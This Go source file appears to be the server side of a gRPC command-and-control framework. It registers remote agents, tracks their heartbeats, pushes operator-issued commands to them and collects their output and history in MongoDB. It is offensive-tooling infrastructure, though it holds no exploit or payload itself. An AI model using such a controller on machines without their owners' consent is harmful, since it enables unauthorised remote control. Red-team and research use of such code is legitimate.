package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo/options"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

func (s *agentServer) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponse, error) {
	machineID := strings.TrimSpace(req.GetMachineId())
	if machineID == "" {
		return nil, status.Error(codes.InvalidArgument, "machine_id is required")
	}

	agentsMu.Lock()
	defer agentsMu.Unlock()

	if _, exists := agents[machineID]; exists {
		return nil, status.Error(codes.AlreadyExists, "agent already registered")
	}

	agents[machineID] = &Agent{
		Hostname: req.GetHostname(),
		OS:       req.GetOs(),
		IP:       req.GetIp(),
		Status:   "ALIVE",
		LastSeen: time.Now(),
	}
	upsertAgentRecord(machineID, agents[machineID], true)

	tasksMu.Lock()
	if _, exists := tasks[machineID]; !exists {
		tasks[machineID] = []pb.Task{}
	}
	tasksMu.Unlock()

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_joined",
		AgentId: machineID,
		Payload: agentRosterPayload(req.GetHostname(), req.GetIp(), "ALIVE"),
	})

	return &pb.RegisterResponse{
		AgentId: machineID,
		Message: fmt.Sprintf("Welcome, %s. Your ID is %s", req.GetHostname(), machineID),
	}, nil
}

func (s *agentServer) Unregister(ctx context.Context, req *pb.UnregisterRequest) (*pb.UnregisterResponse, error) {
	hostname, ok := removeAgent(req.GetAgentId())
	if !ok {
		return nil, status.Error(codes.NotFound, "agent not found")
	}
	markAgentOffline(req.GetAgentId(), hostname)

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_removed",
		AgentId: req.GetAgentId(),
		Payload: hostname,
	})

	return &pb.UnregisterResponse{
		Success: true,
		Message: fmt.Sprintf("Agent %s removed", req.GetAgentId()),
	}, nil
}

func (s *heartbeatServer) SendHeartbeat(stream pb.HeartbeatService_SendHeartbeatServer) error {
	var count int32
	lastStatus := ""
	agentID := ""

	for {
		req, err := stream.Recv()
		if err == io.EOF {
			if agentID != "" {
				removeAgentAndBroadcast(agentID)
			}
			return stream.SendAndClose(&pb.HeartbeatSummary{
				TotalReceived: count,
				LastStatus:    lastStatus,
			})
		}
		if err != nil {
			if agentID != "" {
				removeAgentAndBroadcast(agentID)
			}
			return status.Error(codes.Internal, err.Error())
		}

		agentID = req.GetAgentId()

		agentsMu.Lock()
		if agent, ok := agents[agentID]; ok {
			agent.Status = normalizeStatus(req.GetStatus())
			agent.LastSeen = time.Now()
			upsertAgentRecord(agentID, agent, true)
		}
		agentsMu.Unlock()

		count++
		lastStatus = req.GetStatus()
	}
}

func (s *taskServer) ReceiveTasks(req *pb.TaskRequest, stream pb.TaskService_ReceiveTasksServer) error {
	agentsMu.RLock()
	_, ok := agents[req.GetAgentId()]
	agentsMu.RUnlock()
	if !ok {
		return status.Error(codes.NotFound, "agent not found")
	}

	agentStreamsMu.Lock()
	agentStreams[req.GetAgentId()] = stream
	agentStreamsMu.Unlock()

	tasksMu.Lock()
	queued := append([]pb.Task(nil), tasks[req.GetAgentId()]...)
	tasks[req.GetAgentId()] = nil
	tasksMu.Unlock()

	for i, task := range queued {
		if err := stream.Send(&task); err != nil {
			agentStreamsMu.Lock()
			delete(agentStreams, req.GetAgentId())
			agentStreamsMu.Unlock()

			tasksMu.Lock()
			tasks[req.GetAgentId()] = append(tasks[req.GetAgentId()], queued[i:]...)
			tasksMu.Unlock()
			return err
		}
	}

	<-stream.Context().Done()

	agentStreamsMu.Lock()
	delete(agentStreams, req.GetAgentId())
	agentStreamsMu.Unlock()

	return nil
}

func (s *outputServer) SendOutput(stream pb.OutputService_SendOutputServer) error {
	taskID := ""

	for {
		chunk, err := stream.Recv()
		if err == io.EOF {
			if taskID != "" {
				persistTaskHistory(taskID)
			}
			return stream.SendAndClose(&pb.OutputAck{
				TaskId:  taskID,
				Success: true,
			})
		}
		if err != nil {
			return status.Error(codes.Internal, err.Error())
		}

		taskID = chunk.GetTaskId()

		outputsMu.Lock()
		outputs[taskID] = append(outputs[taskID], chunk.GetLine())
		outputsMu.Unlock()

		broadcastToOperators(&pb.OperatorEvent{
			Type:    "output",
			AgentId: chunk.GetAgentId(),
			Payload: chunk.GetLine(),
		})
	}
}

func (s *operatorServer) Connect(stream pb.OperatorService_ConnectServer) error {
	opID := shortUUID(6)

	operatorsMu.Lock()
	operators[opID] = stream
	operatorsMu.Unlock()
	defer func() {
		operatorsMu.Lock()
		delete(operators, opID)
		operatorsMu.Unlock()
	}()

	type rosterEntry struct {
		id       string
		hostname string
		status   string
		ip       string
	}

	agentsMu.RLock()
	roster := make([]rosterEntry, 0, len(agents))
	for id, agent := range agents {
		roster = append(roster, rosterEntry{id: id, hostname: agent.Hostname, status: agent.Status, ip: agent.IP})
	}
	agentsMu.RUnlock()

	for _, agent := range roster {
		if err := stream.Send(&pb.OperatorEvent{
			Type:    "agent_joined",
			AgentId: agent.id,
			Payload: agentRosterPayload(agent.hostname, agent.ip, agent.status),
		}); err != nil {
			return err
		}
	}

	queryCtx, cancel := context.WithTimeout(stream.Context(), 5*time.Second)
	knownAgents, err := loadKnownAgents(queryCtx)
	cancel()
	if err != nil {
		log.Printf("[server] load known agents error: %v", err)
	} else {
		live := make(map[string]struct{}, len(roster))
		for _, agent := range roster {
			live[agent.id] = struct{}{}
		}
		for _, agent := range knownAgents {
			if _, ok := live[agent.AgentID]; ok {
				continue
			}
			if err := stream.Send(&pb.OperatorEvent{
				Type:    "agent_cached",
				AgentId: agent.AgentID,
				Payload: agentRosterPayload(agent.Hostname, agent.IP, "OFFLINE"),
			}); err != nil {
				return err
			}
		}
	}

	errCh := make(chan error, 1)

	go func() {
		defer close(errCh)
		for {
			cmd, err := stream.Recv()
			if err == io.EOF || stream.Context().Err() != nil {
				errCh <- nil
				return
			}
			if err != nil {
				log.Printf("[server] operator recv error: %v", err)
				errCh <- err
				return
			}

			agentsMu.RLock()
			_, exists := agents[cmd.GetTargetAgentId()]
			agentsMu.RUnlock()
			if !exists {
				_ = stream.Send(&pb.OperatorEvent{
					Type:    "error",
					AgentId: cmd.GetTargetAgentId(),
					Payload: "ERROR: agent not found",
				})
				continue
			}

			taskID := shortUUID(6)
			task := pb.Task{
				TaskId:  taskID,
				Command: cmd.GetCommand(),
				Args:    cmd.GetArgs(),
			}
			trackTask(cmd.GetTargetAgentId(), task)
			pushTaskToAgent(cmd.GetTargetAgentId(), task)

			_ = stream.Send(&pb.OperatorEvent{
				Type:    "ack",
				AgentId: cmd.GetTargetAgentId(),
				Payload: fmt.Sprintf("Task %s dispatched: %s %s", taskID, cmd.GetCommand(), cmd.GetArgs()),
			})
		}
	}()

	select {
	case <-stream.Context().Done():
		return nil
	case err := <-errCh:
		return err
	}
}

func (s *historyServer) ListAgentHistory(ctx context.Context, req *pb.AgentHistoryRequest) (*pb.AgentHistoryResponse, error) {
	if historyCollection == nil {
		return nil, status.Error(codes.FailedPrecondition, "history storage unavailable")
	}
	if req.GetAgentId() == "" {
		return nil, status.Error(codes.InvalidArgument, "agent_id is required")
	}

	limit := req.GetLimit()
	if limit <= 0 || limit > 200 {
		limit = 50
	}

	queryCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	cursor, err := historyCollection.Find(
		queryCtx,
		bson.M{"agent_id": req.GetAgentId()},
		options.Find().SetSort(bson.D{{Key: "executed_at", Value: -1}}).SetLimit(int64(limit)),
	)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	defer cursor.Close(queryCtx)

	var docs []TaskExecution
	if err := cursor.All(queryCtx, &docs); err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	resp := &pb.AgentHistoryResponse{
		Entries: make([]*pb.AgentHistoryEntry, 0, len(docs)),
	}
	for _, doc := range docs {
		resp.Entries = append(resp.Entries, &pb.AgentHistoryEntry{
			TaskId:      doc.TaskID,
			AgentId:     doc.AgentID,
			Command:     doc.Command,
			Args:        doc.Args,
			Output:      doc.Output,
			ExecutedAt:  doc.ExecutedAt.UnixMilli(),
			CompletedAt: doc.CompletedAt.UnixMilli(),
		})
	}
	return resp, nil
}
